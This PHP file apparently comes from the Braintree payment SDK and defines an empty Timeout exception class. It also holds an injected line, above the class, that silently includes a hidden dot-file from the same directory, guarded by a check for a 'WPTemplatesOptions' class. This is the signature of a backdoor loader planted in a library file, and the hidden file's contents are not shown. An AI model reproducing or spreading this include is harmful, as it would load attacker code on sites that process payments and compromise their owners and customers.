<?php
namespace Braintree\Exception;

use Braintree\Exception;

/**
 * Raised when a Timeout occurs
 *
 * @package    Braintree
 * @subpackage Exception
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Timeout extends Exception
{

}
class_alias('Braintree\Exception\Timeout', 'Braintree_Exception_Timeout');
